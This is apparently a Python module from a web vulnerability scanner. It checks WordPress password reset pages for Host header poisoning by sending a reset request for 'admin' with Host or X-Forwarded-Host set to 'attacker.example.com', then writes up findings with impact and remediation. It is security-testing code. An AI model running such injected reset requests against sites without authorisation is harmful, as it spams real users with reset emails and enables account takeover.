"""Password reset poisoning — Host header injection on lostpassword."""

from __future__ import annotations

import logging
from typing import TYPE_CHECKING

import httpx

from core.models import Compliance, Evidence, Finding, Severity, Confidence, FindingType
from modules.base import BazookaModule, ModuleResult

if TYPE_CHECKING:
    from core.engine import ScanContext
    from core.session import BazookaSession

logger = logging.getLogger(__name__)

SUCCESS_INDICATORS = [
    "check your email",
    "check your e-mail",
    "verifiez vos e-mails",
    "verifiez vos emails",
    "lien",
    "email envoye",
    "e-mail envoye",
    "password reset link",
    "confirmation link",
]

ERROR_INDICATORS = [
    "invalid username",
    "unknown username",
    "no user registered",
    "utilisateur invalide",
    "aucun utilisateur",
    "n'existe pas",
]

ATTACKER_HOST = "attacker.example.com"


class PasswordResetPoisoningModule(BazookaModule):
    name = "vuln.password_reset_poisoning"
    phase = "vuln"
    description = "Password reset poisoning via Host header injection"
    profiles = ["standard", "aggressive", "bugbounty"]

    async def run(self, ctx: ScanContext, session: BazookaSession) -> ModuleResult:
        result = ModuleResult()
        base = ctx.target.url.rstrip("/")
        url = f"{base}/wp-login.php?action=lostpassword"
        data = {"user_login": "admin", "wp-submit": "Get New Password"}
        found = False

        attempts = [
            ("Host", {"Host": ATTACKER_HOST}),
            ("X-Forwarded-Host", {"X-Forwarded-Host": ATTACKER_HOST}),
        ]

        for header_name, headers in attempts:
            try:
                resp = await session.post(
                    url,
                    data=data,
                    headers=headers,
                    follow_redirects=False,
                )
            except httpx.TimeoutException:
                logger.debug("Timeout on lostpassword with %s", header_name)
                continue
            except httpx.ConnectError:
                logger.debug("Connect error on lostpassword with %s", header_name)
                continue

            status = resp.status_code
            body_lower = resp.text.lower()

            has_success = any(ind in body_lower for ind in SUCCESS_INDICATORS)
            has_error = any(ind in body_lower for ind in ERROR_INDICATORS)

            # Status 302 redirect to checkemail is the WP success path
            location = resp.headers.get("location", "")
            redirected_to_checkemail = "checkemail=confirm" in location.lower()

            is_suspect = (
                status in (200, 302)
                and not has_error
                and (has_success or redirected_to_checkemail)
            )

            if is_suspect and not found:
                found = True
                excerpt = resp.text[:400] if resp.text else f"Location: {location}"
                result.add_finding(Finding(
                    id="VULN-PWRESET-001",
                    title=f"Password reset potentiellement poisonable via header {header_name}",
                    severity=Severity.MEDIUM,
                    cvss_score=5.3,
                    cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
                    confidence=Confidence.POSSIBLE,
                    finding_type=FindingType.MISCONFIGURATION,
                    description=(
                        f"L'endpoint /wp-login.php?action=lostpassword accepte un header "
                        f"{header_name}: {ATTACKER_HOST} et retourne une reponse de succes "
                        f"(status {status}). Si le mail de reset utilise ce header pour construire "
                        f"l'URL, un attaquant peut empoisonner le lien envoye a la victime."
                    ),
                    evidence=Evidence(
                        request=(
                            f"POST {url}\n{header_name}: {ATTACKER_HOST}\n\n"
                            f"user_login=admin&wp-submit=Get+New+Password"
                        ),
                        response_status=status,
                        response_headers={"Location": location} if location else {},
                        response_body_excerpt=excerpt,
                    ),
                    impact=(
                        "Vol de compte: un attaquant declenche un reset pour la victime; "
                        "le lien de reset pointe vers un domaine controle par l'attaquant. "
                        "Si la victime clique, le token est exfiltre."
                    ),
                    remediation=(
                        "Forcer site_url() statique pour generer les URL dans wp_mail. "
                        "Configurer le serveur (Apache/Nginx) pour rejeter les Host headers "
                        "non whitelistes. Ignorer X-Forwarded-Host sauf derriere un reverse proxy fiable."
                    ),
                    compliance=Compliance(
                        owasp_2021="A07:2021 - Identification and Authentication Failures",
                        cwe="CWE-640",
                    ),
                    references=[
                        "https://cwe.mitre.org/data/definitions/640.html",
                        "https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html",
                    ],
                    phase="vuln",
                    module=self.name,
                    tags=["password-reset", "host-header", "account-takeover"],
                ))

        if not found:
            result.add_finding(Finding(
                id="VULN-PWRESET-CLEAR",
                title="Pas de password reset poisoning detecte",
                severity=Severity.INFO,
                confidence=Confidence.CONFIRMED,
                finding_type=FindingType.INFORMATION_DISCLOSURE,
                description=(
                    "Tests Host et X-Forwarded-Host effectues sur /wp-login.php?action=lostpassword. "
                    "Aucun indicateur de succes suspect detecte."
                ),
                phase="vuln",
                module=self.name,
            ))

        return result
